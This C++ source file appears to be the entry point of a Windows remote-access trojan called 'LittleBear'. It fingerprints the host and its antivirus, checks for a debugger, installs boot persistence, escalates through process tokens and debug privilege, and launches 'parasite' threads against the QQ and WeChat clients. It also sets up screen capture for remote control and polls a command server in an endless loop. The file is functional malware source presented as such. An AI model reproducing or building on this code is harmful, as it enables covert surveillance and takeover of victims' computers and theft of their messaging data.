#include <Windows.h>
#include "api.h"
#include "function/interface.h"
#include "main.h"
#include "AntiVirus.h"
#include "initHelper.h"
#include "winternl.h"
#include "BootStartup.h"
#include "network/NetWorkcommand.h"
#include "function/DeviceInfo.h"
#include <tlhelp32.h>
#include "network/NetWorkData.h"
#include "Config.h"
#include "ExportFunc.h"
#include "filehelper.h"
#include "BootWithApp.h"
#include <DbgHelp.h>
#include "function/lan.h"
#include "InjectDll.h"
#include "Utils.h"
#include "log.h"

#include "json/json.h"
#include <string>
#include <fstream>
#include <iostream>
#include <UserEnv.h>
#include <ShlObj.h>

#pragma comment(lib,"userenv.lib")
#pragma comment(lib,"Shell32.lib")
#pragma comment(lib, "zlib.lib")

using namespace std;

#ifdef _DEBUG
//#pragma comment(lib,"json_vc71_libmtd.lib")
#else
//#pragma comment(lib,"json_vc71_libmt.lib")
#endif

#ifndef _WIN64
#endif

//http://api.ipify.org
//http://icanhazip.com/
//http://ip-api.com/line/



//#define TEST_NETWORK

#define TEST_REBOOTUP

int test() {

	return 0;
}




extern "C" __declspec(dllexport) int __stdcall LittleBear()
{
#ifdef _DEBUG
	test();
#endif

	BOOL bSystemPri = IsSystemPrivilege();
	//BOOL bSystemPri = isSystemDirectory();
	if (bSystemPri)
	{
		char module[MAX_PATH] = { 0 };
		int iRet = GetModuleFileNameA(0, module, MAX_PATH);
		char procName[MAX_PATH] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
		iRet = CreateProcessByToken(procName, module, "");
		writeRawLog("system privilege\r\n");
		ExitProcess(0);
	}

	char szout[1024];
	int iRet = isDebugged();
	if (iRet)
	{
#ifndef _DEBUG
		writeRawLog("debuggered\r\n");
		//return FALSE;
#endif
	}

	//need to be first function
	iRet = _GetApi();
	if (iRet == 0)
	{
		writeRawLog("_GetApi error\r\n");
		return FALSE;
	}
	else
	{
		//after work path created and getapi,u can write log file
		//writeLog("_GetApi ok\r\n");
	}

	iRet = furtherApi();

	//need to get computer info before write log file
	iRet = GetUserAndComputerName(strUserName, strComputerName);
	iCpuBits = GetCpuBits();
	iSystemVersion = GetWindowsVersion(strSysVersion);
	iRet = GetSystemDir(szSysDir);
	iRet = createDataPath();
	if (iRet == FALSE)
	{
		writeLog("createDataPath error\r\n");
		return FALSE;
	}
#ifdef TEST_NETWORK
	iRet = networkInit();
#endif
#ifndef _DEBUG
	iRet = setBoot(szSysDir, strPEResidence, iSystemVersion);
#endif

	DWORD uac = IsUACEnable(iCpuBits, &iEnableLUA, &iConsentPromptBehaviorAdmin, &iPromptOnSecureDesktop);
	iIsUserAdmin = IsAdministratorUser();
	iIsProcessAdmin = IsAdminProcess(0);

	char szAdmin[] = { 'A','d','m','i','n','i','s','t','r','a','t','o','r',0 };
	if (lplstrcmpA(strUserName, szAdmin) == 0)
	{
		iIsAdministrator = TRUE;
	}

	//you can do everything from here after
	iRet = GetAntivirusSoft();
	if (iRet == 0)
	{
		writeLog("GetAntivirusSoft error\r\n");
	}

	iRet = initDisplay(&JPG_STREAM_SIZE, &BMP_STREAM_SIZE, &REMOTECONTROL_BUFFER_SIZE);

	EnableDebugPrivilege((HANDLE)GetCurrentProcessId(), TRUE);

	__try {
		lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)QQParasite, 0, 0, 0));
		lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)WeixinParasite, 0, 0, 0));
	}
	__except (1) {
		writeLog("QQParasite or WeixinParasite exception\r\n");
	}

	iRet = networkInit();

	int tag = 0xff;
	//lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)NetworkData, (LPVOID)tag, 0, 0));

	while (TRUE)
	{
		DWORD dwthreadid = 0;
		HANDLE hnetwork = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)NetWorkCommand, 0, 0, &dwthreadid);

		iRet = lpWaitForSingleObject(hnetwork, INFINITE);
		lpCloseHandle(hnetwork);
		lpSleep(HEARTBEAT_LOOP_DELAY);
	}
	return TRUE;
}









#ifndef  _WINDLL
int __stdcall WinMain(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd)
{

	lpThisDll = hInstance;
	LittleBear();
	ExitProcess(0);
	return TRUE;
}
#elif defined _WINDLL
int __stdcall DllMain(HMODULE hDll, DWORD dwReson, DWORD dwReseved)
{
	lpThisDll = hDll;
	if (dwReson == DLL_PROCESS_ATTACH)
	{
		//DisableThreadLibraryCalls((HMODULE)hDll);
		//CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)LittleBear, 0, 0, 0));
		return TRUE;
	}
	else if (dwReson == DLL_PROCESS_DETACH)
	{
		return TRUE;
	}
	else if (dwReson == DLL_THREAD_ATTACH)
	{
		return TRUE;
	}
	else if (dwReson == DLL_THREAD_DETACH)
	{
		return TRUE;
	}

	return TRUE;
}
#elif defined HOOK_ORG_DLL
int __stdcall DllMain(HMODULE hDll, DWORD dwReson, DWORD dwReseved)
{
	lpThisDll = hDll;
	if (dwReson == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls((HMODULE)hDll);
		return TRUE;
	}
	else if (dwReson == DLL_PROCESS_DETACH)
	{
		return TRUE;
	}
	else if (dwReson == DLL_THREAD_ATTACH)
	{
		return TRUE;
	}
	else if (dwReson == DLL_THREAD_DETACH)
	{
		return TRUE;
	}

	return TRUE;
}
#endif


